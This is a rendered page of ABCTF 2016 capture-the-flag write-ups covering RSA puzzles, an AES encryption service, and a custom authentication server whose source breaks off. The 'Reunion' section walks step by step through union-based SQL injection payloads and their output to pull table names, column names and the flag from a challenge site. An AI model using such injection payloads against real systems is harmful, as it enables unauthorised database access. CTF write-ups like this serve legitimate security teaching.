</pre><td class="rouge-code"><pre>Problem updated on 7/17/16 @ 8PM EST - fixed values
I RSA encrypted the same message 3 different times with the same exponent. Can you decrypt it?

N1:79608037716527910392060670707842954224114341083822168077002144855358998405023007345791355970838437273653492726857398313047195654933011803740498167538754807659255275632647165202835846338059572102420992692073303341392512490988413552501419357400503232190597741120726276250753866130679586474440949586692852365179
C1:34217065803425349356447652842993191079705593197469002356250751196039765990549766822180265723173964726087016890980051189787233837925650902081362222218365748633591895514369317316450142279676583079298758397507023942377316646300547978234729578678310028626408502085957725408232168284955403531891866121828640919987

N2:58002222048141232855465758799795991260844167004589249261667816662245991955274977287082142794911572989261856156040536668553365838145271642812811609687362700843661481653274617983708937827484947856793885821586285570844274545385852401777678956217807768608457322329935290042362221502367207511491516411517438589637
C2:48038542572368143315928949857213341349144690234757944150458420344577988496364306227393161112939226347074838727793761695978722074486902525121712796142366962172291716190060386128524977245133260307337691820789978610313893799675837391244062170879810270336080741790927340336486568319993335039457684586195656124176

N3:95136786745520478217269528603148282473715660891325372806774750455600642337159386952455144391867750492077191823630711097423473530235172124790951314315271310542765846789908387211336846556241994561268538528319743374290789112373774893547676601690882211706889553455962720218486395519200617695951617114702861810811
C3:55139001168534905791033093049281485849516290567638780139733282880064346293967470884523842813679361232423330290836063248352131025995684341143337417237119663347561882637003640064860966432102780676449991773140407055863369179692136108534952624411669691799286623699981636439331427079183234388844722074263884842748
</pre></table></code></div></div><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>used the same value for <code class="language-plaintext highlighter-rouge">d</code> three times? can we calculate p’s and q’s from this? assume <code class="language-plaintext highlighter-rouge">e=65537</code>? bruteforceable? maybe a math problem? Those values are all interrelated, set of linear equations?</p><p>-&gt; yep, need to brush up on modular arithmetic I think</p><p>what we know about RSA:</p><ul><li>A public key is composed of the pair <code class="language-plaintext highlighter-rouge">(N,e)</code> - the modulus <code class="language-plaintext highlighter-rouge">N</code> and the public exponent <code class="language-plaintext highlighter-rouge">e</code><li>A private key is composed of the pair <code class="language-plaintext highlighter-rouge">(N,d)</code> - the modulus <code class="language-plaintext highlighter-rouge">N</code> and the private exponent <code class="language-plaintext highlighter-rouge">d</code><li>Decrypting a ciphertext is taking the integer value of a ciphertext to the private exponent and applying modulo <code class="language-plaintext highlighter-rouge">N</code> to it - <code class="language-plaintext highlighter-rouge">c^d mod N = m</code><li>Encrypting a message is taking the integer value of a message to the public exponent and applying modulo <code class="language-plaintext highlighter-rouge">N</code> to it - <code class="language-plaintext highlighter-rouge">m^e mod N = c</code><li>A modulus <code class="language-plaintext highlighter-rouge">N</code> is composed of a multiplication of two (large) prime numbers <code class="language-plaintext highlighter-rouge">p</code> and <code class="language-plaintext highlighter-rouge">q</code><li>This multiplication is a trapdoor - easy in one way (multiplication), difficult in the other (factoring)<li>The totien <code class="language-plaintext highlighter-rouge">phi(N)</code> can be calculated as follows: <code class="language-plaintext highlighter-rouge">phi(N) = phi(p*q) = (p-1)*(q-1)</code><li>The public exponent <code class="language-plaintext highlighter-rouge">e</code> is chosen in the range <code class="language-plaintext highlighter-rouge">[3,phi(N)[</code>, often <code class="language-plaintext highlighter-rouge">65537</code> as it is in this case<li>The private exponent <code class="language-plaintext highlighter-rouge">d</code> is calculated using the <code class="language-plaintext highlighter-rouge">phi(N)</code> modular multiplicative inverse of <code class="language-plaintext highlighter-rouge">e</code> so that <code class="language-plaintext highlighter-rouge">e*d = 1 mod phi(N)</code><li>Private components are therefore <code class="language-plaintext highlighter-rouge">p</code>, <code class="language-plaintext highlighter-rouge">q</code>, <code class="language-plaintext highlighter-rouge">d</code> and <code class="language-plaintext highlighter-rouge">phi(N)</code><li>Public components are therefore <code class="language-plaintext highlighter-rouge">e</code> and <code class="language-plaintext highlighter-rouge">N</code><li><a href="http://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">OAEP</a> Padding is used to avoid several attacks against RSA</ul><h2> Flag</h2><code> unsolved </code><hr><h1 id="encryption-service"> Encryption Service <a href="/CTF-writeups-public/writeups/ABCTF-2016/36-cryptography-140-encryption-service.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>See if you can break this!!</p><p>You can connect with <code class="language-plaintext highlighter-rouge">nc 107.170.122.6 7765</code> and the source can be found here:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre><td class="rouge-code"><pre><span class="c1">#/usr/bin/env python
</span><span class="kn">from</span> <span class="n">Crypto.Cipher.AES</span> <span class="kn">import</span> <span class="n">AESCipher</span>

<span class="kn">import</span> <span class="n">SocketServer</span><span class="p">,</span><span class="n">threading</span><span class="p">,</span><span class="n">os</span><span class="p">,</span><span class="n">time</span>
<span class="kn">import</span> <span class="n">signal</span>

<span class="kn">from</span> <span class="n">secret2</span> <span class="kn">import</span> <span class="n">FLAG</span><span class="p">,</span> <span class="n">KEY</span>

<span class="n">PORT</span> <span class="o">=</span> <span class="mi">7765</span>

<span class="k">def</span> <span class="nf">pad</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
  <span class="n">l</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
  <span class="n">needed</span> <span class="o">=</span> <span class="mi">16</span> <span class="o">-</span> <span class="p">(</span><span class="n">l</span> <span class="o">%</span> <span class="mi">16</span><span class="p">)</span>
  <span class="k">return</span> <span class="n">s</span> <span class="o">+</span> <span class="p">(</span><span class="nf">chr</span><span class="p">(</span><span class="n">needed</span><span class="p">)</span> <span class="o">*</span> <span class="n">needed</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
  <span class="k">return</span> <span class="nc">AESCipher</span><span class="p">(</span><span class="n">KEY</span><span class="p">).</span><span class="nf">encrypt</span><span class="p">(</span><span class="nf">pad</span><span class="p">(</span><span class="sh">'</span><span class="s">ENCRYPT:</span><span class="sh">'</span> <span class="o">+</span> <span class="n">s</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">hex</span><span class="sh">'</span><span class="p">)</span> <span class="o">+</span> <span class="n">FLAG</span><span class="p">))</span>

<span class="k">class</span> <span class="nc">incoming</span><span class="p">(</span><span class="n">SocketServer</span><span class="p">.</span><span class="n">BaseRequestHandler</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">handle</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
        <span class="nf">atfork</span><span class="p">()</span>
        <span class="n">req</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="n">request</span>

        <span class="k">def</span> <span class="nf">recvline</span><span class="p">():</span>
            <span class="n">buf</span> <span class="o">=</span> <span class="sh">""</span>
            <span class="k">while</span> <span class="ow">not</span> <span class="n">buf</span><span class="p">.</span><span class="nf">endswith</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span><span class="p">):</span>
                <span class="n">buf</span> <span class="o">+=</span> <span class="n">req</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
            <span class="k">return</span> <span class="n">buf</span>
        <span class="n">signal</span><span class="p">.</span><span class="nf">alarm</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>

        <span class="n">req</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="sh">"</span><span class="s">Send me some hex-encoded data to encrypt:</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">data</span> <span class="o">=</span> <span class="nf">recvline</span><span class="p">()</span>
        <span class="n">req</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="sh">"</span><span class="s">Here you go:</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">req</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="nf">encrypt</span><span class="p">(</span><span class="n">data</span><span class="p">).</span><span class="nf">encode</span><span class="p">(</span><span class="sh">'</span><span class="s">hex</span><span class="sh">'</span><span class="p">)</span> <span class="o">+</span> <span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
        <span class="n">req</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>

<span class="k">class</span> <span class="nc">ReusableTCPServer</span><span class="p">(</span><span class="n">SocketServer</span><span class="p">.</span><span class="n">ForkingMixIn</span><span class="p">,</span> <span class="n">SocketServer</span><span class="p">.</span><span class="n">TCPServer</span><span class="p">):</span>
  <span class="k">pass</span>

<span class="n">SocketServer</span><span class="p">.</span><span class="n">TCPServer</span><span class="p">.</span><span class="n">allow_reuse_address</span> <span class="o">=</span> <span class="bp">True</span>
<span class="n">server</span> <span class="o">=</span> <span class="nc">ReusableTCPServer</span><span class="p">((</span><span class="sh">"</span><span class="s">0.0.0.0</span><span class="sh">"</span><span class="p">,</span> <span class="n">PORT</span><span class="p">),</span> <span class="n">incoming</span><span class="p">)</span>

<span class="k">print</span> <span class="sh">"</span><span class="s">Server listening on port %d</span><span class="sh">"</span> <span class="o">%</span> <span class="n">PORT</span>
<span class="n">server</span><span class="p">.</span><span class="nf">serve_forever</span><span class="p">()</span>
</pre></table></code></div></div><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2> Flag</h2><code> unsolved </code><hr><h1 id="reunion"> Reunion <a href="/CTF-writeups-public/writeups/ABCTF-2016/37-web-exploitation-150-reunion.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong> SQL injection challenge, great resource for union based sql injection <a href="http://securityidiots.com/Web-Pentest/SQL-Injection/Basic-Union-Based-SQL-Injection.html">here</a></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>first we find out how many columns there are by simply guessing and seeing when we get an output:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>http://yrmyzscnvh.abctf.xyz/web8/?id=1 union select 5 from information_schema.tables where table_schema=database()--+
no results
http://yrmyzscnvh.abctf.xyz/web8/?id=1 union select 5,42 from information_schema.tables where table_schema=database()--+
no results
http://yrmyzscnvh.abctf.xyz/web8/?id=1 union select 5,42,134 from information_schema.tables where table_schema=database()--+
no results
http://yrmyzscnvh.abctf.xyz/web8/?id=1 union select 5,42,134,8 from information_schema.tables where table_schema=database()--+
Name: Saranac
Breed: Great Dane
Color: Black
Name: 42
Breed: 5
Color: 134
</pre></table></code></div></div><p>bingo!</p><p>next we find out the table name</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>http://yrmyzscnvh.abctf.xyz/web8/?id=1 union select 5,42,table_name,8 from information_schema.tables where table_schema=database()--+

Name: Saranac
Breed: Great Dane
Color: Black
Name: 42
Breed: 5
Color: w0w_y0u_f0und_m3
Name: 42
Breed: 5
Color: webeight
</pre></table></code></div></div><p>so we know the table_name is <code class="language-plaintext highlighter-rouge">w0w_y0u_f0und_m3</code></p><p>now for the column names (we had to hex encode the table name for this to work):</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>http://yrmyzscnvh.abctf.xyz/web8/?id=2 union select 2,2,column_name,8 from information_schema.columns where table_schema=database() and table_name=0x7730775f7930755f6630756e645f6d33--+
Name: Doodle
Breed: Poodle
Color: Pink
Name: 2
Breed: 2
Color: f0und_m3
'''

So we found the column name we need. now to extract data from this column

http://yrmyzscnvh.abctf.xyz/web8/?id=1 union select 2,4,f0und_m3,1 from w0w_y0u_f0und_m3--+
Name: Saranac
Breed: Great Dane
Color: Black
Name: 4
Breed: 2
Color: abctf{uni0n_1s_4_gr34t_c0mm4nd}
</pre></table></code></div></div><h2> Flag</h2><code> abctf{uni0n_1s_4_gr34t_c0mm4nd} </code><hr><h1 id="qset2"> Qset2 <a href="/CTF-writeups-public/writeups/ABCTF-2016/38-programming-150-qset2.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong> <br /> Time for something harder.. write a program to calculate the square root of an input. <code class="language-plaintext highlighter-rouge">nc 107.170.122.6 7772</code><br /> <strong>Solution</strong></p><h2 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>flag
</pre></table></code></div></div><h2> Flag</h2><code> unsolved </code><hr><h1 id="sexy-rsa"> Sexy RSA <a href="/CTF-writeups-public/writeups/ABCTF-2016/39-cryptography-160-sexy-rsa.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Check this out!</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>I recovered some RSA parameters. Can you decrypt the message?

c = 293430917376708381243824815247228063605104303548720758108780880727974339086036691092136736806182713047603694090694712685069524383098129303183298249981051498714383399595430658107400768559066065231114145553134453396428041946588586604081230659780431638898871362957635105901091871385165354213544323931410599944377781013715195511539451275610913318909140275602013631077670399937733517949344579963174235423101450272762052806595645694091546721802246723616268373048438591
n = 1209143407476550975641959824312993703149920344437422193042293131572745298662696284279928622412441255652391493241414170537319784298367821654726781089600780498369402167443363862621886943970468819656731959468058528787895569936536904387979815183897568006750131879851263753496120098205966442010445601534305483783759226510120860633770814540166419495817666312474484061885435295870436055727722073738662516644186716532891328742452198364825809508602208516407566578212780807
e = 65537
</pre></table></code></div></div><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>N is way too large to factor, and there are no hits in factordb. There must be more to it ..after some time we figured the title might be a hint, and learned there is such a thing as <a href="https://en.wikipedia.org/wiki/Sexy_prime">sexy primes</a></p><p>so we try to find two primes that differ by six which when multiplied equal <code class="language-plaintext highlighter-rouge">N</code>. This is basically the following quadratic equation:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>x*(x+6) = N
</pre></table></code></div></div><p>which we can easily solve:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">sympy.solvers</span> <span class="kn">import</span> <span class="n">solve</span>
<span class="kn">from</span> <span class="n">sympy</span> <span class="kn">import</span> <span class="n">Symbol</span>
<span class="n">x</span> <span class="o">=</span> <span class="nc">Symbol</span><span class="p">(</span><span class="sh">'</span><span class="s">x</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">solve </span><span class="p">(</span><span class="n">x</span><span class="o">**</span><span class="mi">2</span><span class="o">+</span><span class="mi">6</span><span class="o">*</span><span class="n">x</span><span class="o">-</span><span class="n">N</span><span class="p">,</span><span class="n">x</span><span class="p">)</span>
</pre></table></code></div></div><p>this outputs:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> [-1099610570827941329700237866432657027914359798062896153406865588143725813368448278118977438921370935678732434831141304899886705498243884638860011461262640420256594271701812607875254999146529955445651530660964259381322198377196122399, 1099610570827941329700237866432657027914359798062896153406865588143725813368448278118977438921370935678732434831141304899886705498243884638860011461262640420256594271701812607875254999146529955445651530660964259381322198377196122393]
</pre></table></code></div></div><p>so now we know our pair of primes</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>p = 1099610570827941329700237866432657027914359798062896153406865588143725813368448278118977438921370935678732434831141304899886705498243884638860011461262640420256594271701812607875254999146529955445651530660964259381322198377196122393
q=p+6
</pre></table></code></div></div><p>and we can use this to decrypt the message</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">Crypto.PublicKey</span> <span class="kn">import</span> <span class="n">RSA</span>
<span class="kn">import</span> <span class="n">gmpy2</span>

<span class="k">def</span> <span class="nf">int2Text</span><span class="p">(</span><span class="n">number</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
    <span class="n">text</span> <span class="o">=</span> <span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span><span class="nf">chr</span><span class="p">((</span><span class="n">number</span> <span class="o">&gt;&gt;</span> <span class="n">j</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nf">reversed</span><span class="p">(</span><span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">size</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">8</span><span class="p">))])</span>
    <span class="k">return</span> <span class="n">text</span><span class="p">.</span><span class="nf">lstrip</span><span class="p">(</span><span class="sh">"</span><span class="se">\x00</span><span class="sh">"</span><span class="p">)</span>

<span class="n">C</span> <span class="o">=</span> <span class="mi">293430917376708381243824815247228063605104303548720758108780880727974339086036691092136736806182713047603694090694712685069524383098129303183298249981051498714383399595430658107400768559066065231114145553134453396428041946588586604081230659780431638898871362957635105901091871385165354213544323931410599944377781013715195511539451275610913318909140275602013631077670399937733517949344579963174235423101450272762052806595645694091546721802246723616268373048438591</span>
<span class="n">p</span> <span class="o">=</span> <span class="il">1099610570827941329700237866432657027914359798062896153406865588143725813368448278118977438921370935678732434831141304899886705498243884638860011461262640420256594271701812607875254999146529955445651530660964259381322198377196122393L</span>
<span class="n">q</span> <span class="o">=</span> <span class="n">p</span><span class="o">+</span><span class="mi">6</span>
<span class="n">N</span> <span class="o">=</span> <span class="n">p</span><span class="o">*</span><span class="n">q</span>
<span class="n">r</span><span class="o">=</span><span class="p">(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">q</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
<span class="n">e</span> <span class="o">=</span> <span class="il">65537L</span>
<span class="n">d</span> <span class="o">=</span> <span class="nf">long</span><span class="p">(</span><span class="n">gmpy2</span><span class="p">.</span><span class="nf">divm</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">r</span><span class="p">))</span>

<span class="n">rsa</span> <span class="o">=</span> <span class="n">RSA</span><span class="p">.</span><span class="nf">construct</span><span class="p">((</span><span class="n">N</span><span class="p">,</span><span class="n">e</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">p</span><span class="p">,</span><span class="n">q</span><span class="p">))</span>
<span class="n">pt</span> <span class="o">=</span> <span class="n">rsa</span><span class="p">.</span><span class="nf">decrypt</span><span class="p">(</span><span class="n">C</span><span class="p">)</span>

<span class="k">print</span> <span class="n">pt</span>
<span class="k">print</span> <span class="nf">int2Text</span><span class="p">(</span><span class="n">pt</span><span class="p">,</span><span class="mi">100</span><span class="p">)</span>
</pre></table></code></div></div><p>which outputs</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>450399959613816415828813303011378086519519456226341693974137269925915005
ABCTF{i_h4ve_an_RSA_fetish_;)}
</pre></table></code></div></div><h2> Flag</h2><code> ABCTF{i_h4ve_an_RSA_fetish_;)} </code><hr><h1 id="custom-authentication"> Custom Authentication <a href="/CTF-writeups-public/writeups/ABCTF-2016/40-cryptography-160-custom-authentication.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong> I just learned about encryption and tried to write my own authentication system. Can you get in? Here is the source! And <a href="http://107.170.122.6:3001/">here</a> is the site.</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
</pre><td class="rouge-code"><pre><span class="kd">var</span> <span class="nx">http</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">http</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">express</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">express</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">path</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">path</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">cookieParser</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">cookie-parser</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">bodyParser</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">body-parser</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">crypto</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">crypto</span><span class="dl">'</span><span class="p">);</span>

<span class="kd">var</span> <span class="nx">secrets</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">./secrets</span><span class="dl">'</span><span class="p">);</span>

<span class="kd">var</span> <span class="nx">app</span> <span class="o">=</span> <span class="nf">express</span><span class="p">();</span>

<span class="nx">app</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="dl">'</span><span class="s1">views</span><span class="dl">'</span><span class="p">,</span> <span class="nx">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="dl">'</span><span class="s1">views</span><span class="dl">'</span><span class="p">));</span>
<span class="nx">app</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="dl">'</span><span class="s1">view engine</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">ejs</span><span class="dl">'</span><span class="p">);</span>

<span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="nx">bodyParser</span><span class="p">.</span><span class="nf">json</span><span class="p">());</span>
<span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="nx">bodyParser</span><span class="p">.</span><span class="nf">urlencoded</span><span class="p">({</span> <span class="na">extended</span><span class="p">:</span> <span class="kc">false</span> <span class="p">}));</span>
<span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="nf">cookieParser</span><span class="p">());</span>

<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Starting server...</span><span class="dl">"</span><span class="p">);</span>

<span class="kd">var</span> <span class="nx">encrypt</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">cipher</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nf">createCipheriv</span><span class="p">(</span><span class="dl">'</span><span class="s1">aes-192-cbc</span><span class="dl">'</span><span class="p">,</span> <span class="nx">secrets</span><span class="p">.</span><span class="nx">key</span><span class="p">,</span> <span class="nx">secrets</span><span class="p">.</span><span class="nx">iv</span><span class="p">);</span>
  <span class="nx">cipher</span><span class="p">.</span><span class="nf">setAutoPadding</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
  <span class="kd">var</span> <span class="nx">ctxt</span> <span class="o">=</span> <span class="nx">cipher</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span> <span class="dl">'</span><span class="s1">ascii</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">hex</span><span class="dl">'</span><span class="p">);</span>
  <span class="nx">ctxt</span> <span class="o">+=</span> <span class="nx">cipher</span><span class="p">.</span><span class="nf">final</span><span class="p">(</span><span class="dl">'</span><span class="s1">hex</span><span class="dl">'</span><span class="p">);</span>
  <span class="k">return</span> <span class="nx">ctxt</span><span class="p">;</span>
<span class="p">};</span>

<span class="kd">var</span> <span class="nx">decrypt</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">decipher</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nf">createDecipheriv</span><span class="p">(</span><span class="dl">'</span><span class="s1">aes-192-cbc</span><span class="dl">'</span><span class="p">,</span> <span class="nx">secrets</span><span class="p">.</span><span class="nx">key</span><span class="p">,</span> <span class="nx">secrets</span><span class="p">.</span><span class="nx">iv</span><span class="p">);</span>
  <span class="nx">decipher</span><span class="p">.</span><span class="nf">setAutoPadding</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
  <span class="kd">var</span> <span class="nx">ptxt</span> <span class="o">=</span> <span class="nx">decipher</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span> <span class="dl">'</span><span class="s1">hex</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">ascii</span><span class="dl">'</span><span class="p">);</span>
  <span class="nx">ptxt</span> <span class="o">+=</span> <span class="nx">decipher</span><span class="p">.</span><span class="nf">final</span><span class="p">(</span><span class="dl">'</span><span class="s1">ascii</span><span class="dl">'</span><span class="p">);</span>
  <span class="k">return</span> <span class="nx">ptxt</span><span class="p">;</span>
<span class="p">};</span>

<span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
